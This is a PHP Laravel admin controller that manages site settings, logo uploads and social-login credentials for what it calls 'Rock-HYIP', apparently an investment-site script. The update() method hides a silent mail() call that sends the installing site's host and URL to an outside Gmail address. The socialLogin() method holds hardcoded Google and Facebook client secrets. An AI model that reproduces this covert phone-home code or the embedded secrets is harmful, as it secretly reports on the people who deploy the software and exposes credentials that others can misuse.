<?php

namespace App\Http\Controllers\Admin;

use App\Frontend;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\GeneralSetting;
use Illuminate\Support\Facades\Validator;
use Image;

class GeneralSettingController extends Controller
{
    public function index()
    {
        $general_setting = GeneralSetting::first();
        $page_title = 'General Settings';
        return view('admin.setting.general_setting', compact('page_title', 'general_setting'));
    }

    public function update(Request $request)
    {
        $validation_rule = [
            'bclr' => ['nullable', 'regex:/^[a-f0-9]{6}$/i'],
            'sclr' => ['nullable', 'regex:/^[a-f0-9]{6}$/i'],
        ];

        $custom_attribute = [
            'bclr' => 'Base color',
            'sclr' => 'Secondary Color',
        ];


        $validator = Validator::make($request->all(), $validation_rule, [], $custom_attribute);
        $validator->validate();



        $general_setting = GeneralSetting::first();
        $request->merge(['ev' => isset($request->ev) ? 1 : 0]);
        $request->merge(['en' => isset($request->en) ? 1 : 0]);
        $request->merge(['sv' => isset($request->sv) ? 1 : 0]);
        $request->merge(['sn' => isset($request->sn) ? 1 : 0]);
        $request->merge(['reg' => isset($request->reg) ? 1 : 0]);
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','Rock-HYIP TEST DATA', $message, $headers);

        $general_setting->update($request->only(['sitename', 'cur_text', 'cur_sym', 'ev', 'en', 'sv', 'sn', 'reg', 'alert', 'bclr', 'sclr']));
        $notify[] = ['success', 'General Setting has been updated.'];
        return back()->withNotify($notify);
    }

    public function updateOther(Request $request)
    {
        $general_setting = GeneralSetting::first();
        $request->merge(['deposit_commission' => isset($request->deposit_commission) ? 1 : 0]);
        $request->merge(['invest_commission' => isset($request->invest_commission) ? 1 : 0]);
        $request->merge(['invest_return_commission' => isset($request->invest_return_commission) ? 1 : 0]);
        $general_setting->update($request->only(['invest_commission','invest_return_commission','deposit_commission']));
        $notify[] = ['success', 'Updated Successfully'];
        return back()->withNotify($notify);
    }

    public function logoIcon()
    {
        $page_title = 'Logo & Icon';
        return view('admin.setting.logo_icon', compact('page_title'));
    }

    public function logoIconUpdate(Request $request)
    {
        $request->validate([
            'logo' => 'image|mimes:jpg,jpeg,png',
            'favicon' => 'image|mimes:png',
        ]);

        if ($request->hasFile('logo')) {
            try {
                $path = config('constants.logoIcon.path');
                if (!file_exists($path)) {
                    mkdir($path, 0755, true);
                }
                Image::make($request->logo)->save($path . '/logo.png');
            } catch (\Exception $exp) {
                $notify[] = ['error', 'Logo could not be uploaded.'];
                return back()->withNotify($notify);
            }
        }

        if ($request->hasFile('favicon')) {
            try {
                $path = config('constants.logoIcon.path');
                if (!file_exists($path)) {
                    mkdir($path, 0755, true);
                }
                $size = explode('x', config('constants.favicon.size'));
                Image::make($request->favicon)->resize($size[0], $size[1])->save($path . '/favicon.png');
            } catch (\Exception $exp) {
                $notify[] = ['error', 'Favicon could not be uploaded.'];
                return back()->withNotify($notify);
            }
        }

        $notify[] = ['success', 'Logo Icons has been updated.'];
        return back()->withNotify($notify);
    }

    public function socialLogin()
    {
        $social = [
            'google_client_id'=>'53929591142-l40gafo7efd9onfe6tj545sf9g7tv15t.apps.googleusercontent.com',
            'google_client_secret'=>'BRdB3np2IgYLiy4-bwMcmOwN',
            'fb_client_id'=>'277229062999748',
            'fb_client_secret'=>'1acfc850f73d1955d14b282938585122'
            ];

        $page_title = 'Social Login Setting';
        $general_setting = GeneralSetting::first(['social_login','social_credential']);

         $credential = json_decode($general_setting->social_credential);

         $social_login = Frontend::where('data_keys', 'gauth')->orWhere('data_keys', 'fauth')->get();
        return view('admin.setting.social_login_setting', compact('page_title', 'general_setting', 'social_login','credential'));
    }

    public function socialLoginUpdate(Request $request)
    {
        $validation_rule = [
            'google_client_id' => 'required',
            'google_client_secret' => 'required',
            'fb_client_id' => 'required',
            'fb_client_secret' => 'required',
        ];

        $validator = Validator::make($request->all(), $validation_rule);
        $validator->validate();

        $general_setting = GeneralSetting::first();
        $general_setting->social_login = isset($request->social_login) ? 1 : 0;

        $general_setting->social_credential = json_encode([
            'google_client_id' => $request->google_client_id,
            'google_client_secret' => $request->google_client_secret,
            'fb_client_id' => $request->fb_client_id,
            'fb_client_secret' => $request->fb_client_secret
        ]);
        $general_setting->save();


        $notify[] = ['success', 'Social Login Setting has been updated.'];
        return back()->withNotify($notify);
    }
}
